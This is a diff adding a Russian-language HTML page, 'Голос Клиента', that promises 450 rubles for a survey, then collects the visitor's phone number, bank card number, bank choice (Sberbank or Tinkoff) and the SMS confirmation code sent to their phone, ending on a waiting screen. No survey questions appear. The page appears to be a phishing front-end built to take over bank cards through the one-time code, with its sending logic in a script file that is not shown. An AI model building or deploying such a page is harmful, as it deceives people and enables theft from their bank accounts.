@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Голос Клиента</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="container">
+        <div id="slide1" class="slide active">
+            <h1>Добро пожаловать на сайт "Голос клиента"</h1>
+            <p>Мы стремимся улучшить качество обслуживания и всегда ищем новые способы взаимодействия с нашими клиентами. Для этого мы проводим анкеты, опросы и исследуем, что важно для наших пользователей.</p>
+            <p>Чтобы поблагодарить вас за участие, мы решили предоставить вознаграждение. Участвуя в нашем опросе, вы получаете шанс на вознаграждение в размере 450 рублей!</p>
+            <p>Заполните анкету и получите деньги на вашу карту в течение нескольких минут. Вся информация будет конфиденциальной, а процесс очень простым.</p>
+            <button class="button" onclick="nextSlide(2)">Продолжить</button>
+        </div>
+
+        <div id="slide2" class="slide">
+            <h2>Введите свои данные</h2>
+            <form id="dataForm">
+                <label for="phone">Номер телефона:</label><br>
+                <input type="text" id="phone" name="phone" required placeholder="Введите номер телефона"><br><br>
+
+                <label for="card">Номер карты:</label><br>
+                <input type="text" id="card" name="card" required placeholder="XXXX XXXX XXXX XXXX"><br><br>
+
+                <label for="bank">Выберите банк:</label><br>
+                <select id="bank" name="bank">
+                    <option value="sberbank">Сбербанк</option>
+                    <option value="tinkoff">Тинькофф</option>
+                </select><br><br>
+
+                <div id="errorMessage" class="error"></div>
+
+                <button type="button" class="button" onclick="sendData()">Далее</button>
+                <button type="button" class="button back-button" onclick="prevSlide(1)">Назад</button>
+            </form>
+        </div>
+
+        <div id="slide3" class="slide">
+            <h2>Введите код подтверждения, который придет на номер телефона</h2>
+            <p>Введите код подтверждения, который вы получите на ваш номер телефона.</p>
+            <input type="text" id="code" name="code" required><br><br>
+            <div id="codeErrorMessage" class="error"></div>
+            <button class="button" onclick="sendCode()">Отправить</button>
+            <button class="button back-button" onclick="prevSlide(2)">Назад</button>
+        </div>
+
+        <div id="slide4" class="slide">
+            <h2>Ожидание</h2>
+            <p>Пожалуйста, подождите несколько секунд...</p>
+            <div id="confirmationMessage" class="message"></div>
+        </div>
+
+        <div class="footer">
+            <p>Вопросы? <a href="#">Свяжитесь с нами</a></p>
+        </div>
+    </div>
+
+    <script src="app.js"></script>
+</body>
+</html>
